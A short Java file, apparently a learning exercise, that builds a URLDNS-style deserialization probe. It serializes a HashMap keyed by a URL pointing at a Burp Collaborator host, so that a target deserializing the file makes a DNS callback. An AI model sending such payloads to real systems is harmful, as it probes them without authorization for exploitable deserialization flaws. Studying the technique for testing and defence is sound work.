package org.deserialization;


import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.URL;
import java.util.HashMap;

public class serialization {
    public static void serialize(Object obj) throws IOException{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static void main(String[] args) throws Exception {
        Person person = new Person(22,"22");
        HashMap<URL,Integer> hashMap= new HashMap<URL,Integer>();
        hashMap.put(new URL("http://nulokbtnilhi8awt6273rqyx9ofe33.burpcollaborator.net"),1);
        serialize(hashMap);
//        System.out.println(person);
//        serialize(person);
    }
}
